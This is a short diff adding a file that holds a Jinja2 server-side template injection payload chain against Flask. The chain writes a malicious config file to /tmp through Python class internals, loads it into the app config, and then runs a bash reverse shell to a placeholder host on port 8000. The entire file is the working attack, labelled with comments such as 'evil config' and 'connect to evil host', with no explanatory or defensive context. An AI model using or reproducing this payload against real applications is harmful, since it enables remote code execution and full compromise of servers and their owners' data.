@@ -1,0 +1,6 @@
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
